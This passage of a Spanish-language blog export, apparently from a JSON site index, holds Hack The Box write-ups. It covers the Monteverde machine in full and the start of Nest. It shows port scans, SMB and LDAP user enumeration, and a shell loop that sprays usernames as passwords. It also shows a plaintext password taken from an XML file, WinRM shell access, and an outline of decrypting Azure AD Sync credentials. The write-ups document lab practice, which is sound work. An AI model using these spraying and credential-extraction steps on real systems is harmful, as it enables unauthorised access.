20,0.5)\u0026#34;,\r\u0026#34;borderColor\u0026#34;:\u0026#34;#9acc14\u0026#34;\r}\r]\r},\r\u0026#34;options\u0026#34;: {\u0026#34;scale\u0026#34;: {\u0026#34;ticks\u0026#34;: {\u0026#34;backdropColor\u0026#34;:\u0026#34;rgba(0,0,0,0)\u0026#34;},\r\u0026#34;angleLines\u0026#34;:{\u0026#34;color\u0026#34;:\u0026#34;rgba(255, 255, 255,0.6)\u0026#34;},\r\u0026#34;gridLines\u0026#34;:{\u0026#34;color\u0026#34;:\u0026#34;rgba(255, 255, 255,0.6)\u0026#34;}\r}\r}\r} NMAP Escaneo de puertos tcp/udp y servicios con nmap.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 # Nmap 7.80 scan initiated Sat Jan 18 18:57:43 2020 as: nmap -p- --min-rate 1000 -sV -sC -o nmap_scan 10.10.10.172 Nmap scan report for 10.10.10.172 Host is up (0.26s latency). Not shown: 65517 filtered ports PORT STATE SERVICE VERSION 53/tcp open domain? | fingerprint-strings: | DNSVersionBindReqTCP: | version |_ bind 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2020-01-19 01:11:44Z) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name) 445/tcp open microsoft-ds? 464/tcp open kpasswd5? 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 636/tcp open ldapssl? 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name) 5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Not Found 9389/tcp open mc-nmf .NET Message Framing 49667/tcp open msrpc Microsoft Windows RPC 49669/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 49670/tcp open msrpc Microsoft Windows RPC 49671/tcp open msrpc Microsoft Windows RPC 49702/tcp open msrpc Microsoft Windows RPC 49775/tcp open msrpc Microsoft Windows RPC 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : SF-Port53-TCP:V=7.80%I=7%D=1/18%Time=5E23AA58%P=x86_64-pc-linux-gnu%r(DNSV SF:ersionBindReqTCP,20,\u0026#34;\\0\\x1e\\0\\x06\\x81\\x04\\0\\x01\\0\\0\\0\\0\\0\\0\\x07version\\ SF:x04bind\\0\\0\\x10\\0\\x03\u0026#34;); Service Info: Host: MONTEVERDE; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: |_clock-skew: 10m36s | smb2-security-mode: | 2.02: |_ Message signing enabled and required | smb2-time: | date: 2020-01-19T01:14:10 |_ start_date: N/A Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Sat Jan 18 19:05:11 2020 -- 1 IP address (1 host up) scanned in 448.85 seconds ENUM4LINUX Vemos que tenemos muchos puertos por enumerar vamos a iniciar con windows en samba y ldap con enum4linux, enumerando los usuarios dentro de la maquina.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 154 155 156 157 158 159 160 161 162 163 164 165 166 167 168 169 170 171 172 173 174 175 176 177 178 179 180 181 182 183 184 185 186 187 Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Sat Jan 18 19:15:47 2020 [ ... REDACTED ... ] =========================================== | Getting domain SID for 10.10.10.172 | =========================================== Domain Name: MEGABANK Domain Sid: S-1-5-21-391775091-850290835-3566037492 [+] Host is part of a domain (not a workgroup) ====================================== | OS information on 10.10.10.172 | ====================================== [+] Got OS info for 10.10.10.172 from smbclient: [+] Got OS info for 10.10.10.172 from srvinfo: Could not initialise srvsvc. Error was NT_STATUS_ACCESS_DENIED ============================= | Users on 10.10.10.172 | ============================= index: 0xfb6 RID: 0x450 acb: 0x00000210 Account: AAD_987d7f2f57d2\tName: AAD_987d7f2f57d2\tDesc: Service account for the Synchronization Service with installation identifier 05c97990-7587-4a3d-b312-309adfc172d9 running on computer MONTEVERDE. index: 0xfd0 RID: 0xa35 acb: 0x00000210 Account: dgalanos\tName: Dimitris Galanos\tDesc: (null) index: 0xedb RID: 0x1f5 acb: 0x00000215 Account: Guest\tName: (null)\tDesc: Built-in account for guest access to the computer/domain index: 0xfc3 RID: 0x641 acb: 0x00000210 Account: mhope\tName: Mike Hope\tDesc: (null) index: 0xfd1 RID: 0xa36 acb: 0x00000210 Account: roleary\tName: Ray O\u0026#39;Leary\tDesc: (null) index: 0xfc5 RID: 0xa2a acb: 0x00000210 Account: SABatchJobs\tName: SABatchJobs\tDesc: (null) index: 0xfd2 RID: 0xa37 acb: 0x00000210 Account: smorgan\tName: Sally Morgan\tDesc: (null) index: 0xfc6 RID: 0xa2b acb: 0x00000210 Account: svc-ata\tName: svc-ata\tDesc: (null) index: 0xfc7 RID: 0xa2c acb: 0x00000210 Account: svc-bexec\tName: svc-bexec\tDesc: (null) index: 0xfc8 RID: 0xa2d acb: 0x00000210 Account: svc-netapp\tName: svc-netapp\tDesc: (null) user:[Guest] rid:[0x1f5] user:[AAD_987d7f2f57d2] rid:[0x450] user:[mhope] rid:[0x641] user:[SABatchJobs] rid:[0xa2a] user:[svc-ata] rid:[0xa2b] user:[svc-bexec] rid:[0xa2c] user:[svc-netapp] rid:[0xa2d] user:[dgalanos] rid:[0xa35] user:[roleary] rid:[0xa36] user:[smorgan] rid:[0xa37] ========================================= | Share Enumeration on 10.10.10.172 | ========================================= Sharename Type Comment --------- ---- ------- SMB1 disabled -- no workgroup available [+] Attempting to map shares on 10.10.10.172 ==================================================== | Password Policy Information for 10.10.10.172 | ==================================================== [+] Attaching to 10.10.10.172 using a NULL share [+] Trying protocol 445/SMB... [+] Found domain(s): [+] MEGABANK [+] Builtin [+] Password Info for Domain: MEGABANK [+] Minimum password length: 7 [+] Password history length: 24 [+] Maximum password age: 41 days 23 hours 53 minutes [+] Password Complexity Flags: 000000 [+] Domain Refuse Password Change: 0 [+] Domain Password Store Cleartext: 0 [+] Domain Password Lockout Admins: 0 [+] Domain Password No Clear Change: 0 [+] Domain Password No Anon Change: 0 [+] Domain Password Complex: 0 [+] Minimum password age: 1 day 4 minutes [+] Reset Account Lockout Counter: 30 minutes [+] Locked Account Duration: 30 minutes [+] Account Lockout Threshold: None [+] Forced Log off Time: Not Set [+] Retieved partial password policy with rpcclient: Password Complexity: Disabled Minimum Password Length: 7 ============================== | Groups on 10.10.10.172 | ============================== [+] Getting builtin groups: group:[Pre-Windows 2000 Compatible Access] rid:[0x22a] group:[Incoming Forest Trust Builders] rid:[0x22d] group:[Windows Authorization Access Group] rid:[0x230] group:[Terminal Server License Servers] rid:[0x231] group:[Users] rid:[0x221] group:[Guests] rid:[0x222] group:[Remote Desktop Users] rid:[0x22b] group:[Network Configuration Operators] rid:[0x22c] group:[Performance Monitor Users] rid:[0x22e] group:[Performance Log Users] rid:[0x22f] group:[Distributed COM Users] rid:[0x232] group:[IIS_IUSRS] rid:[0x238] group:[Cryptographic Operators] rid:[0x239] group:[Event Log Readers] rid:[0x23d] group:[Certificate Service DCOM Access] rid:[0x23e] group:[RDS Remote Access Servers] rid:[0x23f] group:[RDS Endpoint Servers] rid:[0x240] group:[RDS Management Servers] rid:[0x241] group:[Hyper-V Administrators] rid:[0x242] group:[Access Control Assistance Operators] rid:[0x243] group:[Remote Management Users] rid:[0x244] group:[Storage Replica Administrators] rid:[0x246] [+] Getting builtin group memberships: Group \u0026#39;IIS_IUSRS\u0026#39; (RID: 568) has member: Couldn\u0026#39;t lookup SIDs Group \u0026#39;Guests\u0026#39; (RID: 546) has member: Couldn\u0026#39;t lookup SIDs Group \u0026#39;Incoming Forest Trust Builders\u0026#39; (RID: 557) has member: Could not initialise pipe samr. Error was NT_STATUS_INVALID_NETWORK_RESPONSE Group \u0026#39;Pre-Windows 2000 Compatible Access\u0026#39; (RID: 554) has member: Couldn\u0026#39;t lookup SIDs Group \u0026#39;Windows Authorization Access Group\u0026#39; (RID: 560) has member: Couldn\u0026#39;t lookup SIDs Group \u0026#39;Remote Management Users\u0026#39; (RID: 580) has member: Couldn\u0026#39;t lookup SIDs Group \u0026#39;Users\u0026#39; (RID: 545) has member: Couldn\u0026#39;t lookup SIDs [+] Getting local groups: group:[Cert Publishers] rid:[0x205] group:[RAS and IAS Servers] rid:[0x229] group:[Allowed RODC Password Replication Group] rid:[0x23b] group:[Denied RODC Password Replication Group] rid:[0x23c] group:[DnsAdmins] rid:[0x44d] group:[SQLServer2005SQLBrowserUser$MONTEVERDE] rid:[0x44f] group:[ADSyncAdmins] rid:[0x451] group:[ADSyncOperators] rid:[0x452] group:[ADSyncBrowse] rid:[0x453] group:[ADSyncPasswordSet] rid:[0x454] [+] Getting local group memberships: Group \u0026#39;ADSyncAdmins\u0026#39; (RID: 1105) has member: Couldn\u0026#39;t lookup SIDs Group \u0026#39;Denied RODC Password Replication Group\u0026#39; (RID: 572) has member: Couldn\u0026#39;t lookup SIDs [+] Getting domain groups: group:[Enterprise Read-only Domain Controllers] rid:[0x1f2] group:[Domain Users] rid:[0x201] group:[Domain Guests] rid:[0x202] group:[Domain Computers] rid:[0x203] group:[Group Policy Creator Owners] rid:[0x208] group:[Cloneable Domain Controllers] rid:[0x20a] group:[Protected Users] rid:[0x20d] group:[DnsUpdateProxy] rid:[0x44e] group:[Azure Admins] rid:[0xa29] group:[File Server Admins] rid:[0xa2e] group:[Call Recording Admins] rid:[0xa2f] group:[Reception] rid:[0xa30] group:[Operations] rid:[0xa31] group:[Trading] rid:[0xa32] group:[HelpDesk] rid:[0xa33] group:[Developers] rid:[0xa34] [+] Getting domain group memberships: Group \u0026#39;HelpDesk\u0026#39; (RID: 2611) has member: MEGABANK\\roleary Group \u0026#39;Trading\u0026#39; (RID: 2610) has member: MEGABANK\\dgalanos Group \u0026#39;Operations\u0026#39; (RID: 2609) has member: MEGABANK\\smorgan Group \u0026#39;Azure Admins\u0026#39; (RID: 2601) has member: MEGABANK\\Administrator Group \u0026#39;Azure Admins\u0026#39; (RID: 2601) has member: MEGABANK\\AAD_987d7f2f57d2 Group \u0026#39;Azure Admins\u0026#39; (RID: 2601) has member: MEGABANK\\mhope Group \u0026#39;Domain Guests\u0026#39; (RID: 514) has member: MEGABANK\\Guest Group \u0026#39;Domain Users\u0026#39; (RID: 513) has member: MEGABANK\\Administrator Group \u0026#39;Domain Users\u0026#39; (RID: 513) has member: MEGABANK\\krbtgt Group \u0026#39;Domain Users\u0026#39; (RID: 513) has member: MEGABANK\\AAD_987d7f2f57d2 Group \u0026#39;Domain Users\u0026#39; (RID: 513) has member: MEGABANK\\mhope Group \u0026#39;Domain Users\u0026#39; (RID: 513) has member: MEGABANK\\SABatchJobs Group \u0026#39;Domain Users\u0026#39; (RID: 513) has member: MEGABANK\\svc-ata Group \u0026#39;Domain Users\u0026#39; (RID: 513) has member: MEGABANK\\svc-bexec Group \u0026#39;Domain Users\u0026#39; (RID: 513) has member: MEGABANK\\svc-netapp Group \u0026#39;Domain Users\u0026#39; (RID: 513) has member: MEGABANK\\dgalanos Group \u0026#39;Domain Users\u0026#39; (RID: 513) has member: MEGABANK\\roleary Group \u0026#39;Domain Users\u0026#39; (RID: 513) has member: MEGABANK\\smorgan Group \u0026#39;Group Policy Creator Owners\u0026#39; (RID: 520) has member: MEGABANK\\Administrator [ ... REDACTED ... ] Vemos varios usuarios de los cuales no logramos obtener informacion que nos pudiesen ayudar.\nSMBMAP Utilizamos la lista de usuarios junto con smbmap para verificar que alguno de ellos tenga permisos en alguno de los SHARENAMEs de la maquina utilizando el nombre de usuario como contraseña.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 root@aoiri:~/htb/monteverde# while read USER; do echo $USER \u0026amp;\u0026amp; smbmap -H 10.10.10.172 -u $USER -p \u0026#34;$USER\u0026#34;; done \u0026lt; users.txt roleary [+] Finding open SMB ports.... [!] Authentication error on 10.10.10.172 [!] Authentication error on 10.10.10.172 dgalanos [+] Finding open SMB ports.... [!] Authentication error on 10.10.10.172 [!] Authentication error on 10.10.10.172 smorgan [+] Finding open SMB ports.... [!] Authentication error on 10.10.10.172 [!] Authentication error on 10.10.10.172 AAD_987d7f2f57d2 [+] Finding open SMB ports.... [!] Authentication error on 10.10.10.172 [!] Authentication error on 10.10.10.172 mhope [+] Finding open SMB ports.... [!] Authentication error on 10.10.10.172 [!] Authentication error on 10.10.10.172 Guest [+] Finding open SMB ports.... [!] Authentication error on 10.10.10.172 [!] Authentication error on 10.10.10.172 SABatchJobs [+] Finding open SMB ports.... [+] User SMB session established on 10.10.10.172... [+] IP: 10.10.10.172:445\tName: 10.10.10.172 Disk Permissions\tComment ---- -----------\t------- ADMIN$ NO ACCESS\tRemote Admin . dr--r--r-- 0 Fri Jan 3 06:43:36 2020\t. dr--r--r-- 0 Fri Jan 3 06:43:36 2020\t.. azure_uploads READ ONLY\tC$ NO ACCESS\tDefault share E$ NO ACCESS\tDefault share . fr--r--r-- 3 Sun Dec 31 17:57:56 1600\tInitShutdown fr--r--r-- 4 Sun Dec 31 17:57:56 1600\tlsass fr--r--r-- 3 Sun Dec 31 17:57:56 1600\tntsvcs fr--r--r-- 3 Sun Dec 31 17:57:56 1600\tscerpc fr--r--r-- 1 Sun Dec 31 17:57:56 1600\tWinsock2\\CatalogChangeListener-3b4-0 fr--r--r-- 3 Sun Dec 31 17:57:56 1600\tepmapper fr--r--r-- 1 Sun Dec 31 17:57:56 1600\tWinsock2\\CatalogChangeListener-1ec-0 fr--r--r-- 3 Sun Dec 31 17:57:56 1600\tLSM_API_service fr--r--r-- 3 Sun Dec 31 17:57:56 1600\teventlog fr--r--r-- 1 Sun Dec 31 17:57:56 1600\tWinsock2\\CatalogChangeListener-488-0 fr--r--r-- 3 Sun Dec 31 17:57:56 1600\tatsvc fr--r--r-- 1 Sun Dec 31 17:57:56 1600\tWinsock2\\CatalogChangeListener-6a4-0 fr--r--r-- 4 Sun Dec 31 17:57:56 1600\twkssvc fr--r--r-- 1 Sun Dec 31 17:57:56 1600\tWinsock2\\CatalogChangeListener-294-0 fr--r--r-- 1 Sun Dec 31 17:57:56 1600\tWinsock2\\CatalogChangeListener-294-1 fr--r--r-- 3 Sun Dec 31 17:57:56 1600\tRpcProxy\\49669 fr--r--r-- 3 Sun Dec 31 17:57:56 1600\teddf3645116af5dd fr--r--r-- 3 Sun Dec 31 17:57:56 1600\tRpcProxy\\593 fr--r--r-- 4 Sun Dec 31 17:57:56 1600\tsrvsvc fr--r--r-- 3 Sun Dec 31 17:57:56 1600\tspoolss fr--r--r-- 1 Sun Dec 31 17:57:56 1600\tWinsock2\\CatalogChangeListener-b54-0 fr--r--r-- 3 Sun Dec 31 17:57:56 1600\tnetdfs fr--r--r-- 1 Sun Dec 31 17:57:56 1600\tvgauth-service fr--r--r-- 1 Sun Dec 31 17:57:56 1600\tWinsock2\\CatalogChangeListener-280-0 fr--r--r-- 3 Sun Dec 31 17:57:56 1600\tW32TIME_ALT fr--r--r-- 3 Sun Dec 31 17:57:56 1600\tSQLLocal\\MSSQLSERVER fr--r--r-- 2 Sun Dec 31 17:57:56 1600\tsql\\query fr--r--r-- 1 Sun Dec 31 17:57:56 1600\tWinsock2\\CatalogChangeListener-ba0-0 fr--r--r-- 1 Sun Dec 31 17:57:56 1600\tPIPE_EVENTROOT\\CIMV2SCM EVENT PROVIDER fr--r--r-- 1 Sun Dec 31 17:57:56 1600\tCPFATP_6024_v4.0.30319 fr--r--r-- 1 Sun Dec 31 17:57:56 1600\tPSHost.132240333070920024.6024.DefaultAppDomain.miiserver fr--r--r-- 1 Sun Dec 31 17:57:56 1600\tGoogleCrashServices\\S-1-5-18 fr--r--r-- 1 Sun Dec 31 17:57:56 1600\tGoogleCrashServices\\S-1-5-18-x64 fr--r--r-- 1 Sun Dec 31 17:57:56 1600\tWinsock2\\CatalogChangeListener-bac-0 fr--r--r-- 1 Sun Dec 31 17:57:56 1600\tPSHost.132240367071490977.1628.DefaultAppDomain.wsmprovhost IPC$ READ ONLY\tRemote IPC . dr--r--r-- 0 Thu Jan 2 16:05:27 2020\t. dr--r--r-- 0 Thu Jan 2 16:05:27 2020\t.. NETLOGON READ ONLY\tLogon server share . dr--r--r-- 0 Thu Jan 2 16:05:27 2020\t. dr--r--r-- 0 Thu Jan 2 16:05:27 2020\t.. dr--r--r-- 0 Thu Jan 2 16:05:27 2020\tMEGABANK.LOCAL SYSVOL READ ONLY\tLogon server share . dr--r--r-- 0 Fri Jan 3 07:12:48 2020\t. dr--r--r-- 0 Fri Jan 3 07:12:48 2020\t.. dr--r--r-- 0 Fri Jan 3 07:15:23 2020\tdgalanos dr--r--r-- 0 Fri Jan 3 07:41:18 2020\tmhope dr--r--r-- 0 Fri Jan 3 07:14:56 2020\troleary dr--r--r-- 0 Fri Jan 3 07:14:28 2020\tsmorgan users$ READ ONLY\tsvc-ata [+] Finding open SMB ports.... svc-bexec [+] Finding open SMB ports.... [!] Authentication error on 10.10.10.172 [!] Authentication error on 10.10.10.172 Vemos que el usuario SABatchJobs tiene permisos de Lectura en azure_uploads y users$.\nUSER MHOPE Azure PSADPasswordCredential Utilizamos las credenciales para enumerar users$ con smbclient, encontramos un archivo de azure que contiene la contraseña en texto plano en un archivo de XML.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 root@aoiri:~/htb/monteverde# smbclient \\\\\\\\10.10.10.172\\\\users$ -U SABatchJobs Enter WORKGROUP\\SABatchJobs\u0026#39;s password: Try \u0026#34;help\u0026#34; to get a list of possible commands. smb: \\\u0026gt; dir . D 0 Fri Jan 3 07:12:48 2020 .. D 0 Fri Jan 3 07:12:48 2020 dgalanos D 0 Fri Jan 3 07:12:30 2020 mhope D 0 Fri Jan 3 07:41:18 2020 roleary D 0 Fri Jan 3 07:10:30 2020 smorgan D 0 Fri Jan 3 07:10:24 2020 524031 blocks of size 4096. 519955 blocks available smb: \\\u0026gt; cd mhope smb: \\mhope\\\u0026gt; dir . D 0 Fri Jan 3 07:41:18 2020 .. D 0 Fri Jan 3 07:41:18 2020 azure.xml AR 1212 Fri Jan 3 07:40:23 2020 524031 blocks of size 4096. 519955 blocks available smb: \\mhope\\\u0026gt; get azure.xml getting file \\mhope\\azure.xml of size 1212 as azure.xml (1.4 KiloBytes/sec) (average 1.4 KiloBytes/sec) smb: \\mhope\\\u0026gt; exit root@aoiri:~/htb/monteverde# cat azure.xml ��\u0026lt;Objs Version=\u0026#34;1.1.0.1\u0026#34; xmlns=\u0026#34;http://schemas.microsoft.com/powershell/2004/04\u0026#34;\u0026gt; \u0026lt;Obj RefId=\u0026#34;0\u0026#34;\u0026gt; \u0026lt;TN RefId=\u0026#34;0\u0026#34;\u0026gt; \u0026lt;T\u0026gt;Microsoft.Azure.Commands.ActiveDirectory.PSADPasswordCredential\u0026lt;/T\u0026gt; \u0026lt;T\u0026gt;System.Object\u0026lt;/T\u0026gt; \u0026lt;/TN\u0026gt; \u0026lt;ToString\u0026gt;Microsoft.Azure.Commands.ActiveDirectory.PSADPasswordCredential\u0026lt;/ToString\u0026gt; \u0026lt;Props\u0026gt; \u0026lt;DT N=\u0026#34;StartDate\u0026#34;\u0026gt;2020-01-03T05:35:00.7562298-08:00\u0026lt;/DT\u0026gt; \u0026lt;DT N=\u0026#34;EndDate\u0026#34;\u0026gt;2054-01-03T05:35:00.7562298-08:00\u0026lt;/DT\u0026gt; \u0026lt;G N=\u0026#34;KeyId\u0026#34;\u0026gt;00000000-0000-0000-0000-000000000000\u0026lt;/G\u0026gt; \u0026lt;S N=\u0026#34;Password\u0026#34;\u0026gt;4n0therD4y@n0th3r$\u0026lt;/S\u0026gt; \u0026lt;/Props\u0026gt; \u0026lt;/Obj\u0026gt; \u0026lt;/Objs\u0026gt; 1 2 Credenciales: mhope:4n0therD4y@n0th3r$ EvilWinRm Ya que el puerto de winrm esta abierto utilizamos las credenciales que tenemos junto con evilwinrm, obtenemos una shell y nuestra flag user.txt.\nPRIVILEGE ESCALATION Utilizamos whoami /all para ver los permisos, grupos y privilegios que el usuario tiene.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 *Evil-WinRM* PS C:\\Users\\mhope\\Documents\u0026gt; whoami /all USER INFORMATION ---------------- User Name SID ============== ============================================ megabank\\mhope S-1-5-21-391775091-850290835-3566037492-1601 GROUP INFORMATION ----------------- Group Name Type SID Attributes =========================================== ================ ============================================ ================================================== Everyone Well-known group S-1-1-0 Mandatory group, Enabled by default, Enabled group BUILTIN\\Remote Management Users Alias S-1-5-32-580 Mandatory group, Enabled by default, Enabled group BUILTIN\\Users Alias S-1-5-32-545 Mandatory group, Enabled by default, Enabled group BUILTIN\\Pre-Windows 2000 Compatible Access Alias S-1-5-32-554 Mandatory group, Enabled by default, Enabled group NT AUTHORITY\\NETWORK Well-known group S-1-5-2 Mandatory group, Enabled by default, Enabled group NT AUTHORITY\\Authenticated Users Well-known group S-1-5-11 Mandatory group, Enabled by default, Enabled group NT AUTHORITY\\This Organization Well-known group S-1-5-15 Mandatory group, Enabled by default, Enabled group MEGABANK\\Azure Admins Group S-1-5-21-391775091-850290835-3566037492-2601 Mandatory group, Enabled by default, Enabled group NT AUTHORITY\\NTLM Authentication Well-known group S-1-5-64-10 Mandatory group, Enabled by default, Enabled group Mandatory Label\\Medium Plus Mandatory Level Label S-1-16-8448 PRIVILEGES INFORMATION ---------------------- Privilege Name Description State ============================= ============================== ======= SeMachineAccountPrivilege Add workstations to domain Enabled SeChangeNotifyPrivilege Bypass traverse checking Enabled SeIncreaseWorkingSetPrivilege Increase a process working set Enabled USER CLAIMS INFORMATION ----------------------- User claims unknown. Kerberos support for Dynamic Access Control on this device has been disabled. *Evil-WinRM* PS C:\\Users\\mhope\\Documents\u0026gt; Vemos que mhope pertenece al grupo de Azure Admins, despues de investigar acerca de este grupo encontramos un post de XPN que explica como se puede obtener la contraseña y usario desde la base de datos del catalogo de ADSync de azure.\nAzureAd - RedTeam\nUtilizamos el script azuread_decrypt_msol que viene adjunto al post, modificandolo para que pueda hacer el query a la base de datos local.\n1 $client = new-object System.Data.SqlClient.SqlConnection -ArgumentList \u0026#34;Data Source = localhost; Initial Catalog=ADSync; Trusted_Connection=True\u0026#34; Utilizamos las credenciales en evil-winrm obtuvimos una shell y nuestra flag root.txt.\n","description":"Monteverde expone SMB y LDAP donde obtuvimos una lista de usuarios los cuales utilizamos como contraseña para enumerar SMB y obtener credenciales almacenadas que nos dieron acceso por WinRM. El usuario pertenece al grupo Azure Admins lo que permitio conectarnos a la base de datos y obtener credenciales para obtener acceso privilegiado.","id":134,"section":"posts","tags":["azureAD","enum4linux","smbmap","evil-winrm"],"title":"Hack The Box - Monteverde","uri":"https://sckull.github.io/posts/monteverde/"},{"content":"\rTras enumerar SAMBA encontramos credenciales para un segundo recurso donde descubrimos una contraseña encriptada y proyecto de Visual Studio, con este ultimo logramos desencriptar la contraseña. Con ello ingresamos a un nuevo recurso donde encontramos Alternative Data Streams en un ejecutable, dentro de este encontramos una contraseña que utilizamos en un servicio de reporteria, utilizamos DNSPY en un ejecutable para leer el codigo fuente lo que nos permitio conseguir la contraseña del administrador y obtener acceso privilegiado utilizando psexec de Impacket.\nInformacion de la Maquina Nombre Nest OS Windows Puntos 20 Dificultad Facil IP 10.10.10.178 Maker VbScrub\nMatrix\r{\r\u0026#34;type\u0026#34;:\u0026#34;radar\u0026#34;,\r\u0026#34;data\u0026#34;:{\r\u0026#34;labels\u0026#34;:[\u0026#34;Enumeration\u0026#34;,\u0026#34;Real-Life\u0026#34;,\u0026#34;CVE\u0026#34;,\u0026#34;Custom Explotation\u0026#34;,\u0026#34;CTF-Like\u0026#34;],\r\u0026#34;datasets\u0026#34;:[\r{\r\u0026#34;label\u0026#34;:\u0026#34;User Rate\u0026#34;, \u0026#34;data\u0026#34;:[8, 5.8, 3.8, 6.2, 4.2],\r\u0026#34;backgroundColor\u0026#34;:\u0026#34;rgba(75, 162, 189,0.5)\u0026#34;,\r\u0026#34;borderColor\u0026#34;:\u0026#34;#4ba2bd\u0026#34;\r},\r{ \u0026#34;label\u0026#34;:\u0026#34;Maker Rate\u0026#34;,\r\u0026#34;data\u0026#34;:[8, 7, 1, 9, 3],\r\u0026#34;backgroundColor\u0026#34;:\u0026#34;rgba(154, 204, 20,0.5)\u0026#34;,\r\u0026#34;borderColor\u0026#34;:\u0026#34;#9acc14\u0026#34;\r}\r]\r},\r\u0026#34;options\u0026#34;: {\u0026#34;scale\u0026#34;: {\u0026#34;ticks\u0026#34;: {\u0026#34;backdropColor\u0026#34;:\u0026#34;rgba(0,0,0,0)\u0026#34;},\r\u0026#34;angleLines\u0026#34;:{\u0026#34;color\u0026#34;:\u0026#34;rgba(255, 255, 255,0.6)\u0026#34;},\r\u0026#34;gridLines\u0026#34;:{\u0026#34;color\u0026#34;:\u0026#34;rgba(255, 255, 255,0.6)\u0026#34;}\r}\r}\r} MASSCAN \u0026amp; NMAP Escaneo de puertos tcp/udp y servicios con masscan y nmap, encontramos el puerto samba (445) y el puerto 2386 abiertos.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 Starting masscan 1.0.5 (http://bit.ly/14GZzcT) at 2020-01-29 04:56:39 GMT -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth Initiating SYN Stealth Scan Scanning 1 hosts [131070 ports/host] Discovered open port 4386/tcp on 10.10.10.178 Discovered open port 445/tcp on 10.10.10.178 # Nmap 7.80 scan initiated Tue Jan 28 22:23:24 2020 as: nmap -p- --min-rate 1000 -sV -sC -o nmap_scan 10.10.10.178 Nmap scan report for 10.10.10.178 Host is up (0.34s latency). Not shown: 65533 filtered ports PORT STATE SERVICE VERSION 445/tcp open microsoft-ds? 4386/tcp open unknown | fingerprint-strings: | DNSStatusRequestTCP, DNSVersionBindReqTCP, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, LPDString, NULL, RPCCheck, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, X11Probe: | Reporting Service V1.2 | FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, RTSPRequest, SIPOptions: | Reporting Service V1.2 | Unrecognised command | Help: | Reporting Service V1.2 | This service allows users to run queries against databases using the legacy HQK format | AVAILABLE COMMANDS --- | LIST | SETDIR \u0026lt;Directory_Name\u0026gt; | RUNQUERY \u0026lt;Query_ID\u0026gt; | DEBUG \u0026lt;Password\u0026gt; |_ HELP \u0026lt;Command\u0026gt; ... [snip] ... Host script results: |_clock-skew: 1m15s | smb2-security-mode: | 2.02: |_ Message signing enabled but not required | smb2-time: | date: 2020-01-29T04:29:38 |_ start_date: 2020-01-29T03:11:05 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Tue Jan 28 22:29:02 2020 -- 1 IP address (1 host up) scanned in 338.05 seconds SMBCLIENT Listamos los SHARENAMES de la maquina, vemos que existe Data, Secure$ y Users, en los cuales tenemos acceso.\n1 2 3 4 5 6 7 8 9 10 11 12 root@aoiri:~/htb/nest# smbclient -L 10.10.10.178 Enter WORKGROUP\\root\u0026#39;s password: Sharename Type Comment --------- ---- ------- ADMIN$ Disk Remote Admin C$ Disk Default share Data Disk IPC$ IPC Remote IPC Secure$ Disk Users Disk SMB1 disabled -- no workgroup available Utilizamos el SHARENAME Data con un usuario \u0026lsquo;anonimo\u0026rsquo; y sin contraseña para enumerar los archivos, encontramos dentro de Shared dos archivos de texto.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 root@aoiri:~/htb/nest# smbclient \\\\\\\\10.10.10.178\\\\Data Enter WORKGROUP\\root\u0026#39;s password: Try \u0026#34;help\u0026#34; to get a list of possible commands. smb: \\\u0026gt; dir . D 0 Wed Aug 7 16:53:46 2019 .. D 0 Wed Aug 7 16:53:46 2019 IT D 0 Wed Aug 7 16:58:07 2019 Production D 0 Mon Aug 5 15:53:38 2019 Reports D 0 Mon Aug 5 15:53:44 2019 Shared D 0 Wed Aug 7 13:07:51 2019 10485247 blocks of size 4096. 